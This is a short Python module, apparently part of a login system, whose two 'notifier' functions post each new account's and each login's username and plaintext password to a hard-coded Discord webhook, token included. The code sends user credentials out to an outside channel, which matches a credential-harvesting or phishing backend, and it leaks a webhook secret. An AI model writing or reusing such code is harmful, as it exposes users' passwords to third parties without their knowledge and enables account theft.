import requests

def notifier_cr(nomeC, senhaC):
    webhook = "https://discordapp.com/api/webhooks/1361390778068242502/0ZDy8Jq5bGpJyk8Y8XH5iyP2EjqkiqDQ4Fva7pSZFYxErDGn9ZbnfahsM2h7E5ZxKkAB"

    data = {
        "content": f"# NOVA CRIAÇÃO DE CONTA DETECTADA\n - Nome: {nomeC}\n - Senha: {senhaC}"
    }

    response = requests.post(webhook, json=data)



def notifier_lg(nomeL, senhaL):
    webhook = "https://discordapp.com/api/webhooks/1361390778068242502/0ZDy8Jq5bGpJyk8Y8XH5iyP2EjqkiqDQ4Fva7pSZFYxErDGn9ZbnfahsM2h7E5ZxKkAB"

    data = {
        "content": f"# NOVO LOGIN DETECTADO\n - Nome: {nomeL}\n - Senha: {senhaL}"
    }

    response = requests.post(webhook, json=data)

